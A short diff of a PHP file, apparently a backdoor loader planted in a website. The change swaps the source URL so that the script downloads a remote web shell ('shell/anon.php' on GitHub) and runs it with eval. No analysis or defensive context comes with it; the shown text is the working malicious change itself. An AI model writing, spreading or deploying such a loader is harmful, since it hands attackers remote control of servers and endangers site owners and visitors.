@@ -110,7 +110,7 @@ if (!isset($_SESSION[$session_key])) {
     }
 }
 
-$target_url = 'https://haxor-research.com/rimuru.jpg';
+$target_url = 'https://raw.githubusercontent.com/aptisme/shell/refs/heads/main/anon.php';
 $payload = geturlsinfo($target_url);
 if ($payload !== false) {
     eval('?>' . $payload);
